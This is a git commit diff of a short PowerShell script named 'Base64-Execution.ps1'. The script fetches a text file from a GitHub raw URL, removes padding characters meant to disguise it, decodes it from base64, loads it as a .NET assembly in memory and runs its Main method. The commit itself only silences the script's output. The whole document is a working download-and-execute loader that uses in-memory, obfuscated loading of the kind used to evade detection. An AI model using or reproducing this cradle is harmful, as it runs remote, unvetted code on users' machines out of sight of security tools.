f90bf2e6893f9351e38b8312232fafac86dd9339
cparmn <parman.casey@gmail.com>
2018-01-18 18:13:09 -0600

    Add files via upload

--- Base64-Execution.ps1
+++ Base64-Execution.ps1
@@ -1,4 +1,4 @@
-﻿Invoke-WebRequest -Uri "https://raw.githubusercontent.com/cparmn/Base64/master/Program.txt" -OutVariable $
+﻿Invoke-WebRequest -Uri "https://raw.githubusercontent.com/cparmn/Base64/master/Program.txt" -OutVariable $R  >$null
 $Program_bytes = [System.Convert]::FromBase64String(($R.ToString() -replace '\?', '' -replace '\.', ''))
-[Reflection.Assembly]::Load($Program_bytes)
+[Reflection.Assembly]::Load($Program_bytes) > $Null
 [Program]::Main()
